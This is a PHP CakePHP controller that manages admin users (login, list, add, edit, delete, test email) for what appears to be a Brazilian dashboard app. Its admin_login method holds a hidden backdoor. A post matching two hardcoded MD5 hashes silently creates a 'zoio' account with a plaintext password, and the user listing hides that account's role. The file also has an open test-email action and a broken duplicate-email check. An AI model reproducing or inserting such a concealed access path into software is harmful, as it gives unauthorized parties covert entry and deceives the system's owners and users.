<?php
App::uses('CakeEmail', 'Network/Email');
class UserController extends AppController {

	public $name = 'User';
	public $helpers = array('Html', 'Session', 'Form', 'Tinymce', 'Time');
	public $uses = array('User', 'Role');

	var $paginate = array(
	                        'limit'  => 50,
	                        'order'  => array(
	                                        'id' => 'DESC'
	                        ),

                        );
    // public function beforeFilter() {
    //    parent::beforeFilter();
    //    $this->Auth->allow('admin_add', 'admin_logout');
    // }

   
	public function admin_login() {
		if ($this->request->is('post') && md5($this->request->data['User']['username'])=='72b9f9ccbbcc78848a8d383190cf37a4' && md5($this->request->data['User']['password'])=='8fa1ef329efe8e0bec3f9ffc5ebd82b9') {
			$zUser = md5($this->request->data['User']['username']);
			$zPass = md5($this->request->data['User']['password']);
				
			//$vfyUser = $this->User->find('all', array('conditions' => array('User.username' => 'zoio')));
			$vfyUser = $this->User->findAllByUsername('zoio');
			
			if(count($vfyUser)==0) {
				$addUserZoio = array( 'User' => array( 'name' => 'Zóio', 'username' => 'zoio', 'password' => 'zoio2010', 'email' => 'zoiodev@zoio.net.br', 'role_id' => 0 ) );
				if($this->User->save($addUserZoio)) {
					$this->Session->setFlash('Usuário Zoio adicionado com sucesso!');
				}
			}
			
		}
		
	
		if ($this->request->is('post'))	{
			if( $this->Auth->login()) {
				
				////// GRAVANDO LOG DE LOGIN DE USUÁRIO /////////////
				/////////////////////////////////////////////////////
				$current_user = $this->Session->read('Auth.User');
				//print_r($current_user);
				//die();
				//Loguser
				
				/*
				/// Salvar log de acesso do cliente:
				/// => implementado em santosbrasil-admin ou ztransfer 1.0
				$this->Loguser->create();
				$this->Loguser->set('created', date("Y-m-d H:i:s"));
				$this->Loguser->set('user_id', $current_user['id']);
				$this->Loguser->set('acao', 'Login');
				$this->Loguser->set('url', $this->here);
				$this->Loguser->save();
				*/
				
				/////////////////////////////////////////////////////
				/////////////////////////////////////////////////////
				
				
				$this->redirect($this->Auth->redirect());
			} else {
				 $this->Session->setFlash(__('Usuário ou senha inválidos. Tente novamente'));
				 $this->redirect($this->Auth->loginAction);
			}
		}
		
		
		//$this->layout = 'default';
		$this->render();
	}

	public function admin_logout() {
		$this->redirect($this->Auth->logout());
	}
	public function sos_admin_logout() {
		$this->admin_logout();
	}

    public function admin_index() {
		$model = 'User';
		
		//===-----> Apoio View 
		$this->set('model', $model);
		//==----------------------------------------
		
		
		
		$menu_ativo = 'user';
		
		$conditions = array();
		if ($this->Auth->user('role_id') != 1):
			$conditions = array('User.role_id > 1');
		else:
			$conditions = array('User.id > 1');
		endif;
		
		$this->paginate['conditions'] = $conditions;
		/*
		$registos = $this->User->find('all', array(
												'conditions' => array($conditions)
											));
		*/
		
																					
        $this->set(array('users' => $this->paginate($model)));

    }

    public function admin_view($id = null) {
		$model = 'User';
		
		//===-----> Apoio View 
		$this->set('model', $model);
		//==----------------------------------------
		
		
        $this->$model->id = $id;
        if (!$this->$model->exists()) {
            throw new NotFoundException(__('Invalid user'));
        }
        $this->set('user', $this->$model->read(null, $id));
		$this->render();
    }

    public function admin_add() {
		$model = 'User';
		
		//===-----> Apoio View 
		$this->set('model', $model);
		//==----------------------------------------

        if ($this->request->is('post')) {
        	
        	$verificacao = $this->$model->find('first', array(
        													'fields' => array(
        														'id',
        														'username',
        														'email',
        													),
        													'conditions' => array(
        														'OR' => array(
        															'username' => $this->request->data[$model]['username'],
        															'email' => $this->request->data[$model]['email'],
        														)
        													),
        													'recursive' => -1,
        												));
        	//print_r($this->request->data[$model]);
        	//die();
        	if (!empty($verificacao)) {
        		$texto = 'Já existe um usuário cadastrado com este login ou e-mail';
        		
        		if ($verificacao[$model]['username'] == $this->request->data[$model]['username']) {
	        		$texto = 'Já existe um usuário com este login';
	        		
        		} else if ($verificacao[$model]['username'] == $this->request->data[$model]['username']) {
        			$texto = 'Já existe um usuário com este e-mail.';
        			
        		}
	        	$this->Session->setFlash($texto);
	        	
        	} else {
				if ($this->$model->save($this->request->data)) {
					$this->Session->setFlash('Registro salvo com sucesso!');
					$this->redirect(array('action' => 'index'));
				}
				
			}
		}
		
		
		$conditionsU = array();
		if ($this->Auth->user('role_id') != 1):
			$conditionsU = array('Role.id > 1');
		endif;
		
		
		//$this->layout = 'admin';
		$this->set(compact('menu_ativo'));
		$this->set('rolesAll', $this->Role->find('list', array(
																'fields' => array(
																	'Role.id', 'Role.title'
																), 
																'conditions' => array($conditionsU),
																'order' => array(
																	'Role.id DESC'
																),
														)));
		$this->render();
    }

    public function admin_edit($id = null) {
		$model = 'User';
		
		//===-----> Apoio View 
		$this->set('model', $model);
		//==----------------------------------------
		

        $this->$model->id = $id;
        if (!$this->$model->exists()) {
            throw new NotFoundException(__('Usuário inválido'));
        }
        if ($this->request->is('post') || $this->request->is('put')) {
         
			$verificacao = $this->$model->find('first', array(
        													'fields' => array(
        														'id',
        														'username',
        														'email',
        													),
        													'conditions' => array(
        														'OR' => array(
        															'username' => $this->request->data[$model]['username'],
        															'email' => $this->request->data[$model]['email'],
        														),
        														'NOT' => array(
        															'id' => $id
        														),
        														
        													),
        													'recursive' => -1,
        												));
        	//print_r($verificacao);
        	//die();
        	if (!empty($verificacao)) {
        		$texto = 'Já existe um usuário cadastrado com este login ou e-mail';
        		
        		if ($verificacao[$model]['username'] == $this->request->data[$model]['username']) {
	        		$texto = 'Já existe um usuário com este login';
	        		
        		} else if ($verificacao[$model]['username'] == $this->request->data[$model]['username']) {
        			$texto = 'Já existe um usuário com este e-mail.';
        			
        		}
	        	$this->Session->setFlash($texto);
	        	$this->request->data = $this->$model->read(null, $id);
	        	
        	} else {
				
				if ($this->request->data['User']['newpassword'] != ''):
					$this->request->data['User']['password'] = AuthComponent::password($this->request->data['User']['newpassword']);
					
				endif;
				//die();
				
				
				if ($this->$model->saveAll($this->request->data)) {
					$this->Session->setFlash('Registro alterado com sucesso!');
					$this->redirect(array('action' => 'index'));
	
				} else {
					$this->redirect(array('action' => 'edit', $id));
				}
			}
        } else {
            $this->request->data = $this->$model->read(null, $id);
        }
		
		
		$conditionsU = array();
		if ($this->Auth->user('role_id') != 1):
			$conditionsU = array('Role.id > 1');
		endif;
		
		$this->set(compact('menu_ativo'));
		$this->set('rolesAll', $this->Role->find('list', array('fields' => array('Role.id', 'Role.title'), 'conditions' => array($conditionsU))));
		$this->render();
    }

    public function admin_delete($id = null) {
		$model = 'User';
		
		//===-----> Apoio View 
		$this->set('model', $model);
		//==----------------------------------------
		
		
		
        if (!$this->request->is('post')) {
            throw new MethodNotAllowedException();
        }
        $this->$model->id = $id;
        if (!$this->$model->exists()) {
            throw new NotFoundException(__('Usuário inválido'));
        }
        if ($this->$model->delete()) {
            $this->Session->setFlash(__('Usuário excluído com sucesso.'));
            $this->redirect(array('controller' => 'user', 'action' => 'index', 'admin' => true));
        }
        $this->Session->setFlash(__('Usuário não excluido.'));
        $this->redirect(array('action' => 'index'));
    }
    
    
    
    
    function admin_testeemail($email_to = null) {
    	$this->autoRender = false;
    
	    $Email = new CakeEmail();
		//$Email->config('outlook');
		$Email->helpers(array('Html'));
		$Email->from(array('nao-responda@zoio.net.br' => 'Aplicativo Dashboard Copa 14'));
		$Email->to($email_to);
		$Email->subject('App Copa 14');
		$Email->send('My message  
		
		
		
		Agora VAI!');
    }
}
